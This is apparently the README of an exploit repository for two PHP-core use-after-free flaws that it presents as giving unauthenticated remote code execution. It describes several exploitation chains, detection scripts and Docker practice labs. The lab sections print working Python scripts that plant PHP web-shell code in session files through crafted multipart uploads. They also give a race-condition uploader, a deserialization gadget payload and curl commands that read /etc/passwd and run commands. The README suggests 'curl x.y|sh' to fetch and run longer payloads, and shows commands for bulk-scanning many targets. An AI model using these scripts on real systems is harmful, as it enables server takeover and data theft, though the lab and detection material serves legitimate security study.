# php2shell — CVE-2026-109618 / CVE-2026-109619

Pre-auth Remote Code Execution in PHP via `session.upload_progress` abuse.

Two PHP-core use-after-free vulnerabilities (patched 2026-10-21) that enable
unauthenticated RCE on any PHP application — WordPress, Laravel, Drupal,
custom code — if the PHP version is in range. No application code opts in;
the bug fires in the PHP interpreter itself, before any app code or WAF runs.

This repository contains two **complementary exploitation chains**, detection
tools, technical documentation, and hands-on practice labs:

| Chain | Tool | Approach | Requires App Bug? | SAPI |
|-------|------|----------|-------------------|------|
| **Session File Inclusion** | `p2s.py` | OOM → persist session file → LFI/deser | Yes (LFI or gadget) | PHP-FPM, mod_php |
| **Heap UAF** | `edb-52704.py` | 2-stage ASLR leak → fake struct → hijack pDestructor | **No** | mod_php prefork |
| **Heap UAF 128M** | `oracle-exploit/` | Cookie-based ASLR leak → heap spray → zif_system | **No** | mod_php (production defaults) |

> **Authorized use only.** These tools are for authorized penetration testing,
> security research, and CTF/lab practice. Do not use against systems you do not
> have explicit permission to test.

---

## Table of Contents

- [Affected Versions](#affected-versions)
- [The Vulnerability](#the-vulnerability)
  - [Memory-Level Root Cause](#memory-level-root-cause)
  - [Session File Inclusion Perspective](#session-file-inclusion-perspective)
  - [Attack Chain: SFI](#attack-chain-session-file-inclusion)
  - [Attack Chain: Heap UAF](#attack-chain-heap-uaf-exploitation)
  - [Attack Chain: Heap UAF 128M](#oracle-exploit--heap-chain-for-production-defaults)
- [Exploitation Approaches](#exploitation-approaches)
- [Repository Structure](#repository-structure)
- [Quick Start](#quick-start)
- [Detection Tools](#detection-tools)
- [Exploit Tools](#exploit-tools)
- [Hands-On Labs](#hands-on-labs)
- [Key Concepts](#key-concepts)
- [Offset Extraction](#offset-extraction)
- [Documentation](#documentation)
- [Requirements](#requirements)
- [References](#references)
- [Credits](#credits)

---

## Affected Versions

| Branch | Vulnerable | Fixed in |
|--------|------------|----------|
| 8.5 | 8.5.0 – 8.5.11 | 8.5.12 |
| 8.4 | 8.4.0 – 8.4.26 | 8.4.27 |
| 8.3 | 8.3.0 – 8.3.35 | 8.3.36 |
| 8.2 | 8.2.0 – 8.2.34 | 8.2.35 |
| 5.4 – 8.1 | All versions | EOL — no patch available |

**~99.998% of internet-facing PHP was vulnerable at disclosure.** The
`session.upload_progress.enabled` setting defaults to `On` in every PHP build
since 5.4. No application code needs to opt in — the engine-level handler
fires on any multipart POST with the right field names.

---

## The Vulnerability

### Memory-Level Root Cause

**CVE-2026-109618** (CVSS 9.2) — Uninitialized pointer use after `longjmp`:

PHP's `_zend_hash_str_add_or_update_i()` (the internal function that inserts
string keys into arrays) **increments the array's internal counters before the
key string is fully initialized**. A crafted multipart POST driven through the
`session.upload_progress` path exhausts `memory_limit`; the OOM fires
`longjmp()`/`zend_bailout()`, abandoning the C routine mid-initialization. The
key is left uninitialized but counted as valid. Request cleanup then walks the
`$_POST` array, misreads the invalid key, and follows an attacker-controlled
function pointer table → code execution.

**CVE-2026-109619** (CVSS 9.2) — Use-after-free via stale global state:

Request-owned internal state (OOM error info, session handler pointers in
`PS(id)`, `PS(http_session_vars)`) is stored in process-global variables but
**not cleared at request shutdown**. After an OOM abort, the next request on
the same worker process finds stale pointers to freed memory. When
`fatal_error_backtraces` is enabled (the default), the most recent fatal
error's backtrace also persists in global state — a diagnostic run on the next
request operates on attacker-controlled data.

**Chained:** The leaked `php2shell` PoC (Calif.IO) uses 109618 to shape freed
memory and 109619 to reuse it → instruction-pointer control → reliable unauth
RCE.

### Session File Inclusion Perspective

PHP's `session.upload_progress` feature tracks upload progress by writing
metadata — including the uploaded file's **filename** — into the session file
at `/tmp/sess_<PHPSESSID>`. The attacker controls:

1. The **session ID** (via the `PHPSESSID` cookie) → controls the file path
2. The **filename** (via `Content-Disposition`) → controls content (PHP code)
3. The **progress name** (via `PHP_SESSION_UPLOAD_PROGRESS` field) → controls
   the key

Normally, `session.upload_progress.cleanup=On` (the default) deletes the
progress data when the upload completes. But an OOM crash before cleanup
leaves the session file on disk with attacker-controlled PHP code.

### Attack Chain: Session File Inclusion

```
┌─────────────────────────────────────────────────────────────┐
│                session.upload_progress                        │
│                                                              │
│  Attacker POSTs multipart with:                              │
│   • PHPSESSID=<chosen-id>                                   │
│   • PHP_SESSION_UPLOAD_PROGRESS=<name>                      │
│   • filename="<?php system('cmd'); ?>"                      │
│   • 30 × 200KB non-file fields (OOM trigger)                │
│                                                              │
│           ┌──── OOM kills worker ────┐                       │
│           │  cleanup never runs      │                       │
│           │  /tmp/sess_<id> persists │                       │
│           └──────────┬───────────────┘                       │
│                      │                                       │
│     ┌────────────────┼──────────────────┐                    │
│     ▼                ▼                  ▼                    │
│  Strategy A     Strategy B        Strategy C                 │
│  OOM + LFI      Race + LFI       Handler Deser              │
│  (easiest)      (no OOM needed)   (no LFI needed)           │
│                                                              │
│  Include the     Slow-drip the    php_serialize writes |     │
│  session file    upload, race     as literal; php handler    │
│  via LFI         LFI reads        splits on | → unserialize │
│  ?page=/tmp/     during upload    gadget → __destruct → RCE │
│  sess_<id>                                                   │
└─────────────────────────────────────────────────────────────┘
```

### Attack Chain: Heap UAF Exploitation

```
┌─────────────────────────────────────────────────────────────┐
│                  Heap UAF Chain (EDB-52704)                   │
│       No LFI needed — works against ANY PHP page             │
│                                                              │
│  Stage 0: Worker Rotation                                    │
│  ─────────────────────────                                   │
│  1001 fields + OOM → corrupt heap                            │
│  Session-init on corrupt heap → segfault                     │
│  Apache prefork forks fresh worker                           │
│                                                              │
│  Stage 1: Heap Leak (ASLR defeat #1)                        │
│  ────────────────────────────────────                        │
│  OOM corrupts PS(id) → dangling pointer                      │
│  Next request: PS(id) → freed memory                         │
│  Set-Cookie: PHPSESSID=<raw heap bytes>                      │
│  Extract Zend MM chunk base (2MB-aligned mode)               │
│                                                              │
│  Stage 2: Code Leak (ASLR defeat #2)                        │
│  ────────────────────────────────────                        │
│  Different OOM shape → HashTable at PS(id)                   │
│  pDestructor field = ZVAL_PTR_DTOR address                   │
│  Set-Cookie leaks it → compute libphp base                   │
│                                                              │
│  Stage 3: Fake Struct → RCE                                  │
│  ────────────────────────                                    │
│  167-byte payload: fake HashTable + execute_data + zend_str  │
│  pDestructor = zif_system (from Stage 2 base + offset)       │
│  Overwrite PS(http_session_vars)                             │
│  Request cleanup → array destruction → pDestructor(cmd)      │
│  → system("id>/out/p1") → RCE                               │
└─────────────────────────────────────────────────────────────┘
```

---

## Exploitation Approaches

The two chains are **complementary, not competing** — each covers scenarios
the other cannot:

| Aspect | SFI Chain (`p2s.py`) | Heap UAF Chain (`edb-52704.py`) |
|--------|---------------------|-------------------------------|
| **Approach** | Poison session file → include/deserialize | Direct heap corruption → hijack pDestructor |
| **Requires app-level bug** | Yes (LFI or gadget class) | **No — any PHP page** |
| **ASLR bypass** | Not needed | Yes (2-stage info leak via Set-Cookie) |
| **SAPI** | PHP-FPM + nginx, mod_php | mod_php + Apache prefork only |
| **Worker model** | Multi-worker OK | Single-worker required |
| **Max command length** | Unlimited | 14 bytes (167-byte carrier limit) |
| **Config requirements** | `memory_limit < post_max_size` | `memory_limit=8M`, `display_errors=1`, `use_strict_mode=0` |
| **PHP versions tested** | 5.4+ (SFI); 7.4 (deser chain) | 8.4.26 (profiled); theoretically broader |
| **Reliability** | Deterministic (OOM+LFI) to probabilistic (race) | Probabilistic (heap layout, retries) |
| **OOM trigger** | 30×200KB non-file fields (zend 4× amplification) | 1001 short fields + 12MB big field + file metadata alloc |

**When to use which:**
- **SFI chain** — when the target has an LFI or a deserializable gadget class.
  More reliable, works on PHP-FPM (the common production setup).
- **Heap UAF chain** — when there's no application-level bug but the target
  runs mod_php/prefork. Common in Docker/dev environments, less common in
  production. Only needs any PHP page to exist.

---

## Repository Structure

```
php2shell/
├── README.md                  # this file
├── p2s.py                     # SFI chain: unified scanner + exploit (7 chains)
├── edb-52704.py               # Heap UAF chain: OffSec 3-stage exploit
├── oracle-exploit/            # Oracle-Security mod_php 128M heap chain
│   ├── exploit.py             # ASLR bypass via cookie leak + zif_system RCE
│   ├── offsets.py             # ELF offset extractor for libphp.so
│   ├── serve.py               # proof-of-execution callback server
│   └── README.md
├── detect_php2shell.py        # safe version-based detection (1 GET)
├── detect_behavioral.py       # behavioral detection (no version headers needed)
├── php2shell.py               # godylockz original exploit (mod_php/Apache)
├── php2shell_fpm.py           # FPM-specific exploit variant
├── offsets.py                 # offset extractor for mod_php binaries
├── offsets_fpm.py             # offset extractor for PHP-FPM binaries
├── profiles/                  # pre-extracted binary offset profiles
│   ├── fpm-php-8.1.34.json
│   ├── php-8.3.33-bookworm-amd64.json
│   ├── php-8.3.35-bookworm-amd64.json
│   ├── php-8.4.25-bookworm-amd64.json
│   ├── php-8.4.26-bookworm-amd64.json
│   ├── php-8.5.11-bookworm-amd64.json
│   └── php-lab.json
├── docker/                    # mod_php exploit lab (Apache)
│   ├── docker-compose.yml
│   ├── php.ini
│   ├── apache.conf
│   └── www/
├── labs/                      # session file inclusion practice labs
│   ├── verify.py              # automated verifier for all 3 labs
│   ├── lab-oom-lfi/           # Lab 1: OOM + LFI → RCE (port 8801)
│   ├── lab-race-lfi/          # Lab 2: Race condition + LFI (port 8802)
│   └── lab-deser-rce/         # Lab 3: Deserialization RCE (port 8803)
└── docs/                      # technical deep-dives
    ├── heap-exploitation.md   # full EDB-52704 chain walkthrough
    ├── attack-primitives.md   # catalog of all known primitives
    ├── detection-guide.md     # detection, WAF rules, IR guidance
    └── patch-analysis.md      # source-level patch diff analysis
```

---

## Quick Start

### Detection (safe, no exploit payload)

```bash
# Offline — classify a known PHP version
python3 detect_php2shell.py --version 8.3.12

# Live — fingerprint a target's PHP version from headers
python3 detect_php2shell.py --url https://target.example/

# Behavioral — when version headers are hidden
python3 detect_behavioral.py https://target.example/
```

### SFI Exploit (authorized targets only)

```bash
# Scan + auto-detect
python3 p2s.py https://target.example/

# Deep probe (OOM + stale state detection)
python3 p2s.py https://target.example/ --deep

# Attempt RCE
python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
```

### Heap UAF Exploit (mod_php/prefork targets)

```bash
# Against a local Docker lab (auto-extracts offsets)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php

# With a custom command (max 14 bytes)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1

# Official php:8.4.26-apache image (bookworm profile, default)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile bookworm

# Lab build (Apache 2.4.68)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile lab
```

### Practice Labs

```bash
# Start all 3 SFI labs
cd labs
for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
  (cd $d && docker compose up -d --build)
done

# Verify they work
python3 verify.py

# Lab URLs:
# Lab 1 — http://localhost:8801  (OOM + LFI)
# Lab 2 — http://localhost:8802  (Race + LFI)
# Lab 3 — http://localhost:8803  (Deserialization)
```

---

## Detection Tools

### detect_php2shell.py — Version-Based Detection

Fingerprints the target's PHP version from `X-Powered-By` headers and
error-page banners. Sends **one normal GET** — no multipart, no payload,
no memory-corruption trigger. Classifies against the patch line.

```bash
# Offline check
python3 detect_php2shell.py --version 8.4.26
# → VULN: 8.4.26 < 8.4.27 (fixed in 8.4.27)

python3 detect_php2shell.py --version 8.4.27
# → SAFE: 8.4.27 >= 8.4.27

# Live fingerprint
python3 detect_php2shell.py --url https://target.example/
python3 detect_php2shell.py --url https://target.example/ --path /info.php
```

### detect_behavioral.py — Behavioral Detection

Works when `expose_php=Off`, `display_errors=Off`, and no version headers are
exposed. Uses a 4-layer behavioral probe:

| Layer | What it does | Risk |
|-------|-------------|------|
| 1 | PHP presence heuristics | None — passive |
| 2 | `session.upload_progress` feature detection | None — standard POST |
| 3 | OOM worker-crash differential | Worker restart (same as any large POST) |
| 4 | Worker stability confirmation | None — repeat of layer 1 |

```bash
# Full 4-layer scan
python3 detect_behavioral.py https://target.example/

# Quick (layers 1-2 only, no OOM probe)
python3 detect_behavioral.py https://target.example/ --quick

# Bulk scanning with proxy
python3 detect_behavioral.py -f targets.txt -o results.jsonl --proxy http://127.0.0.1:8080
```

---

## Exploit Tools

### p2s.py — SFI Chain (Session File Inclusion)

The unified scanner + exploit. Zero dependencies (Python 3.8+ stdlib only).

#### Modes

| Mode | Flag | What it does |
|------|------|-------------|
| Fingerprint | (default) | Version detection + classification |
| Deep probe | `--deep` | OOM crash test + stale-state detection |
| RCE | `--rce` | Multi-strategy RCE attempt |
| Bulk scan | `-f targets.txt` | Parallel fingerprinting |

#### RCE Chains (7 strategies, auto-selected by SAPI)

| ID | Name | Mechanism | Requirements |
|----|------|-----------|-------------|
| `sfi` | SFI + LFI | Session file injection → LFI include | upload_progress=On + LFI sink |
| `sfi_oom` | SFI + OOM + LFI | OOM prevents cleanup → LFI includes session | + body > memory_limit |
| `race` | Race + LFI | Slow-drip upload keeps session alive → race LFI | upload_progress + LFI + timing |
| `modphp` | mod_php heap (godylockz) | Heap UAF → zif_system | mod_php + display_errors=On + low mem |
| `modphp128` | mod_php heap 128M (Oracle) | Cookie ASLR leak → heap spray → zif_system | mod_php + production defaults |
| `mismatch` | Handler mismatch deser | serialize_handler mismatch → deserialization | Two dirs with different handlers |
| `fpm` | FPM heap | FPM-specific offset-based heap exploit | FPM + per-build offset profile |

```bash
python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
python3 p2s.py --version 8.3.12        # offline version check
python3 p2s.py -f targets.txt -o results.jsonl --workers 10  # bulk scan
```

#### Safety Guardrails

- Declines patched PHP versions (override: `--force`)
- Requires `--allow-remote` for non-loopback targets
- Preflight checks Server header

### edb-52704.py — Heap UAF Chain

OffSec's 3-stage heap exploitation exploit. Achieves RCE through direct memory
corruption — **no LFI or application-level bug required**.

#### Stages

| Stage | What | Output |
|-------|------|--------|
| 0 | Worker rotation | Fresh prefork worker |
| 1 | Heap leak | Zend MM chunk base address |
| 2 | libphp leak | libphp.so base address |
| 3 | Fake struct write | `pDestructor = zif_system` → RCE |

#### Requirements

- **mod_php under Apache prefork** with a single worker
- `memory_limit=8M`, `display_errors=1`, `session.use_strict_mode=0`
- The `docker/` directory contains a matching lab setup

```bash
# Default (bookworm profile = official php:8.4.26-apache)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php

# Lab profile (Apache 2.4.68)
python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile lab

# Custom offsets
python3 edb-52704.py -u http://target/ --zif-offset 0x43A870 --dtor-offset 0x613C50
```

**Command length limit:** The 167-byte payload carrier allows a maximum of
**14 bytes** for the command. For longer commands, chain through a short
trigger (e.g., write a script first, then `sh</out/c`).

See [docs/heap-exploitation.md](docs/heap-exploitation.md) for the full
technical walkthrough.

### oracle-exploit/ — Heap Chain for Production Defaults

Oracle-Security's mod_php heap chain works with **real-world production defaults**:
`display_errors=Off` + `memory_limit=128M` — the configuration edb-52704 cannot reach.

#### How it differs from edb-52704

| Aspect | edb-52704 | oracle-exploit |
|--------|-----------|----------------|
| `display_errors` | Must be `On` (leak via error page) | Works with `Off` (leak via PHPSESSID cookie) |
| `memory_limit` | 8M (tight heap layout) | 128M (production default) |
| ASLR bypass | Heap → libphp from error page | ~600KB freed memory disclosed in cookie value |
| Offset source | Pre-extracted profiles | `offsets.py` extracts from live `libphp.so` ELF |

#### Usage

```bash
# Extract offsets from target's libphp.so
python3 oracle-exploit/offsets.py /path/to/libphp.so

# Exploit with proof-of-execution callback
python3 oracle-exploit/exploit.py \
  --url http://target/index.php \
  --cmd 'id' \
  --proof-url http://YOUR_SERVER/proof \
  --expect uid= \
  --verbose

# Start the proof callback listener
python3 oracle-exploit/serve.py --port 8888
```

**Command limit:** 14 bytes (same as edb-52704). For longer payloads: `curl x.y|sh`.

Source: [Oracle-Security/CVEs](https://github.com/Oracle-Security/CVEs/tree/main/WordPress/PHP2Shell)

---

## Hands-On Labs

Three Docker labs for learning the SFI exploit chain manually. Each lab
teaches a different attack strategy.

| Lab | Port | PHP | Difficulty | Technique |
|-----|------|-----|------------|-----------|
| 1 | 8801 | 8.1-fpm | Easy | OOM prevents session cleanup → LFI includes session file |
| 2 | 8802 | 8.1-fpm | Medium | Slow-drip upload holds session open → race the LFI |
| 3 | 8803 | 7.4-fpm | Hard | OOM + handler mismatch → gadget deserialization, no LFI needed |

All labs use nginx + PHP-FPM, are fully self-contained, and can run
simultaneously on different ports.

---

### Lab 1: OOM + Session File Inclusion (port 8801)

**Config:** `memory_limit=8M`, `post_max_size=50M`, `client_max_body_size=50m`

**The vulnerability:** A classic Local File Inclusion in `?page=` combined with
a low `memory_limit`. The app includes any file path that passes a weak regex
filter — it blocks special characters but allows absolute paths and `/tmp/`.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Confirm LFI exists
   curl http://localhost:8801/?page=/etc/passwd
   # → root:x:0:0:root:/root:/bin/bash ...

   # Check PHP configuration
   curl http://localhost:8801/info.php
   # Look for: memory_limit=8M, session.upload_progress.enabled=On
   ```

2. **Poison the session file**

   Craft a multipart POST with:
   - Cookie: `PHPSESSID=<your-chosen-id>` (e.g., `hackertest01`)
   - Form field: `PHP_SESSION_UPLOAD_PROGRESS=anything`
   - File part with PHP code as the filename:
     `filename="<?php system($_GET['c']); ?>"`
   - **30 non-file form fields**, each ~200KB of padding data

   The 30 large fields allocate ~24MB in zend memory (4× overhead), exceeding
   the 8MB `memory_limit`. The worker OOMs before `session.upload_progress.cleanup`
   can delete the progress data. The session file persists at
   `/tmp/sess_hackertest01` with your PHP code inside.

   ```python
   import socket

   sid = "hackertest01"
   bnd = "----exploit"
   php = "<?php system($_GET['c']); ?>"

   body = bytearray()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="{php}"\r\nContent-Type: application/octet-stream\r\n\r\nX\r\n'.encode()
   for i in range(30):
       body += f'--{bnd}\r\nContent-Disposition: form-data; name="p{i}"\r\n\r\n'.encode()
       body += b"Z" * 200000 + b"\r\n"
   body += f"--{bnd}--\r\n".encode()

   sock = socket.create_connection(("127.0.0.1", 8801), timeout=30)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {len(body)}\r\n"
       f"Cookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + bytes(body)
   )
   # Wait for response (will be 200 or connection reset from OOM)
   ```

3. **Trigger RCE via LFI**

   ```bash
   curl "http://localhost:8801/?page=/tmp/sess_hackertest01&c=id"
   # → uid=33(www-data) gid=33(www-data) groups=33(www-data)

   curl "http://localhost:8801/?page=/tmp/sess_hackertest01&c=cat+/etc/hostname"
   ```

#### Key Lessons

- Non-file form fields stay in `$_POST` zend memory with ~4× overhead. File
  contents go to disk temp files and don't count toward `memory_limit`.
- Use **single quotes** in the PHP payload to avoid breaking the
  `Content-Disposition` double-quote attribute.
- `?page=/etc/passwd` is the quick LFI confirmation — if it works, so will
  `/tmp/sess_*`.

---

### Lab 2: Race Condition LFI (port 8802)

**Config:** `memory_limit=512M`, `post_max_size=50M`, `client_max_body_size=1m`

**The vulnerability:** Same LFI as Lab 1, but the memory limit is too high
(512MB) and the nginx body limit is too low (1MB) to trigger OOM. You must
race the session file instead.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Confirm LFI
   curl http://localhost:8802/?page=/etc/passwd

   # Confirm OOM is unreachable
   curl http://localhost:8802/info.php
   # memory_limit=512M — way too high for OOM via 1MB body limit
   ```

2. **Slow-drip upload (Terminal 1)**

   Start a multipart POST that sends the headers normally (with PHP code as
   filename and `PHP_SESSION_UPLOAD_PROGRESS` field), but **drip-feeds the
   file body** very slowly (e.g., 4KB every 50ms). While the upload is
   in-progress, the session file exists with your PHP code.

   ```python
   import socket, time

   sid = "racetest01"
   bnd = "----race"
   php = "<?php system('id'); ?>"

   header = (
       f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
       f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'
       f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="{php}"\r\n'
       f'Content-Type: application/octet-stream\r\n\r\n'
   ).encode()
   file_size = 800000  # ~800KB, within 1MB limit
   footer = f"\r\n--{bnd}--\r\n".encode()
   total = len(header) + file_size + len(footer)

   sock = socket.create_connection(("127.0.0.1", 8802), timeout=60)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {total}\r\nCookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + header
   )

   # Drip-feed: 4KB every 50ms ≈ 16 seconds total
   for offset in range(0, file_size, 4000):
       sock.sendall(b"A" * min(4000, file_size - offset))
       time.sleep(0.05)  # THIS keeps the session file alive

   sock.sendall(footer)
   sock.close()
   ```

3. **Race the LFI (Terminal 2, simultaneously)**

   ```bash
   # Rapid-fire LFI requests — one will land while the session exists
   while true; do
     curl -s "http://localhost:8802/?page=/tmp/sess_racetest01" | grep -q "uid=" && echo "RCE!" && break
     sleep 0.01
   done
   ```

#### Key Lessons

- This is a classic **TOCTOU race condition**. The window is small (seconds)
  but real.
- `session.upload_progress.cleanup=On` deletes the progress data when the
  upload **completes**. A slow upload keeps it alive.
- Threading or async I/O (one thread uploads, one thread races LFI) is
  more reliable than two terminals.
- May need multiple attempts — the race is probabilistic.

---

### Lab 3: Session Deserialization RCE (port 8803)

**Config:** `memory_limit=8M`, `post_max_size=50M`, PHP **7.4**,
`session.serialize_handler=php_serialize`

**The vulnerability:** A handler mismatch — the session is written with the
`php_serialize` handler (globally configured), but `trigger.php` reads it with
the default `php` handler via `ini_set()`. Combined with a gadget class
(`LogRotator`) that calls `system()` in its `__destruct()` method, this
achieves RCE **without any LFI**.

#### Background: Session Serialization Handlers

PHP has two main session serialization formats:

| Handler | Format | Example |
|---------|--------|---------|
| `php` | `key\|serialized_value` | `visits\|i:3;` |
| `php_serialize` | `serialize($_SESSION)` | `a:1:{s:6:"visits";i:3;}` |

The `|` character means different things to each handler. The `php` handler
treats it as a key/value separator. The `php_serialize` handler treats it as
a literal character inside a string.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Check configuration
   curl http://localhost:8803/info.php
   # → session.serialize_handler = php_serialize
   # → memory_limit = 8M

   # Read the app — find the gadget class and the handler mismatch
   curl http://localhost:8803/
   # → LogApp Dashboard, shows php_serialize handler
   ```

2. **Identify the gadget**

   In `index.php`, the `LogRotator` class has:
   ```php
   public function __destruct() {
       if ($this->archive_cmd && $this->logfile) {
           @system($this->archive_cmd);
       }
   }
   ```
   If you can make PHP deserialize a `LogRotator` with a controlled
   `archive_cmd`, it calls `system()` when the object is destroyed.

3. **Identify the handler mismatch**

   `trigger.php` does:
   ```php
   ini_set('session.serialize_handler', 'php');
   session_start();
   ```
   This reads the session file with the `php` handler, which splits on `|`.

4. **Generate the gadget payload**

   ```bash
   # Let PHP tell you the correct serialized form:
   docker exec lab-deser-rce-php-1 php -r '
     class LogRotator { public $logfile; public $archive_cmd; }
     $o = new LogRotator();
     $o->logfile = "/tmp";
     $o->archive_cmd = "id";
     echo serialize($o) . "\n";
   '
   # → O:10:"LogRotator":2:{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:2:"id";}
   ```

   > **Critical:** `LogRotator` is **10** characters → `O:10:`, not `O:11:`.
   > An off-by-one silently breaks `unserialize()` — it returns `false` with
   > no error message. Always let PHP generate the serialized form, or count
   > the class name length very carefully.

5. **Poison the session**

   The `PHP_SESSION_UPLOAD_PROGRESS` field value becomes a KEY in the session
   array. Prepend `|` followed by the serialized gadget:

   ```
   |O:10:"LogRotator":2:{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:2:"id";}
   ```

   Send the poison multipart (same as Lab 1, with OOM fields to prevent cleanup):

   ```python
   import socket

   sid = "desertest01"
   bnd = "----deser"
   cmd = "id"
   gadget = f'O:10:"LogRotator":2:{{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:{len(cmd)}:"{cmd}";}}'
   inject = f"|{gadget}"

   body = bytearray()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{inject}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="t.bin"\r\nContent-Type: application/octet-stream\r\n\r\nX\r\n'.encode()
   for i in range(30):
       body += f'--{bnd}\r\nContent-Disposition: form-data; name="p{i}"\r\n\r\n'.encode()
       body += b"Z" * 200000 + b"\r\n"
   body += f"--{bnd}--\r\n".encode()

   sock = socket.create_connection(("127.0.0.1", 8803), timeout=30)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {len(body)}\r\n"
       f"Cookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + bytes(body)
   )
   ```

6. **Trigger deserialization**

   ```bash
   curl http://localhost:8803/trigger.php -b "PHPSESSID=desertest01"
   # → uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

#### Key Lessons

- **Class name length is critical.** `O:10:` not `O:11:` for `LogRotator`.
  `unserialize()` returns `false` on mismatch — no error, just silent failure.
- The `|` in the progress name is the entire attack: `php_serialize` stores
  it literally, `php` handler reads it as a key/value separator.
- PHP's `unserialize()` is **lenient** — it reads one complete value and
  ignores trailing data. The garbage after your gadget doesn't break it.
- This does **NOT work on PHP 8.1+** — they hardened session decode to destroy
  the session on handler mismatch. PHP 7.4 and below are vulnerable.
- **Real-world trigger:** applications where different pages or modules use
  different session handlers (e.g., a legacy admin panel with `php` handler
  alongside a modern app using `php_serialize`).

---

## Key Concepts

### session.upload_progress

When `session.upload_progress.enabled=On` (the default), PHP automatically
tracks file upload progress in the session. No application code opts in. The
session key is `upload_progress_<NAME>` where the name comes from the
`PHP_SESSION_UPLOAD_PROGRESS` form field. The **filename** from
`Content-Disposition` is stored verbatim — this is where attacker code lands.

### OOM as a Primitive

`session.upload_progress.cleanup=On` (default) normally deletes progress data
when the upload finishes. But if the PHP worker crashes from an out-of-memory
condition before cleanup, the poisoned session file persists.

Two known OOM trigger techniques:

| Technique | Mechanism | Used by |
|-----------|-----------|---------|
| **Non-file field amplification** | 30×200KB fields → ~24MB zend alloc (4× overhead) → OOM at 8MB | p2s.py |
| **File metadata allocation** | 1001 short fields + 12MB big field; PHP allocates file metadata arrays even with no filename/data | edb-52704.py |

### Session-Based Heap Disclosure (ASLR Defeat)

OOM during session initialization leaves `PS(id)` as a dangling pointer. The
next request on the same worker reads `PS(id)` to construct `Set-Cookie:
PHPSESSID=...` — but `PS(id)` now points to freed memory. Raw heap bytes are
URL-encoded into the cookie and sent to the attacker. Two rounds defeat ASLR:
one for the Zend MM chunk base, one for the libphp base.

### `fatal_error_backtraces` Global State Poisoning

Default-on since PHP 8.x. The most recent fatal error's backtrace persists in
process-global memory. An attacker triggers OOM with controlled data in the
call stack → the backtrace records attacker-controlled pointers → a diagnostic
run on the next request (same worker) operates on this data. This is the
CVE-2026-109619 exploitation path.

### Session Serialization Handler Mismatch

| Write handler | Read handler | Result |
|--------------|-------------|--------|
| `php_serialize` | `php_serialize` | Normal — `\|` stays inside a string key |
| `php_serialize` | `php` | **Vulnerable** — `php` splits on `\|`, unserializes the rest |
| `php` | `php` | Normal |
| `php` | `php_serialize` | Parse error (no exploit) |

### Gadget Classes

Any PHP class with a dangerous `__destruct()` or `__wakeup()` method is a
potential gadget. Common patterns:
- `system()` / `exec()` / `passthru()` in destructor
- `file_put_contents()` in destructor (write a webshell)
- `include()` / `require()` in destructor (LFI)

Real-world examples: WordPress `WP_HTML_Token`, Laravel `PendingBroadcast`,
Symfony `Process`.

---

## Offset Extraction

For Strategy C (heap exploit) and the EDB-52704 chain, you need binary offsets
for the target's exact PHP build. The `profiles/` directory contains
pre-extracted offsets for common builds.

```bash
# Extract offsets from a mod_php binary
python3 offsets.py /path/to/libphp.so > profiles/my-target.json

# Extract offsets from an FPM binary
python3 offsets_fpm.py /path/to/php-fpm > profiles/my-target-fpm.json

# Use with p2s.py
python3 p2s.py https://target/ --rce --profile profiles/my-target.json

# EDB-52704 auto-extracts from a running Docker container
python3 edb-52704.py -u http://127.0.0.1:8088/index.php --docker-container php2shell-target
```

---

## Documentation

Detailed technical writeups in `docs/`:

| Document | What it covers |
|----------|---------------|
| [Heap Exploitation](docs/heap-exploitation.md) | Full EDB-52704 chain walkthrough: stage-by-stage heap manipulation, payload structure, profile calibration |
| [Attack Primitives](docs/attack-primitives.md) | Catalog of all 7 known attack primitives and their composition into exploit chains |
| [Detection Guide](docs/detection-guide.md) | Version/behavioral detection, network IoCs, WAF rules, log queries, incident response |
| [Patch Analysis](docs/patch-analysis.md) | Source-level analysis of the PHP 8.3.35→8.3.36 diff: what changed and why |

---

## Requirements

- **Python 3.8+** — stdlib only, zero `pip install` dependencies
- **Docker** — for the practice labs and offset extraction
- **Target prerequisites:**

  *SFI chain (p2s.py):*
  - `session.upload_progress.enabled=On` (default in all PHP builds since 5.4)
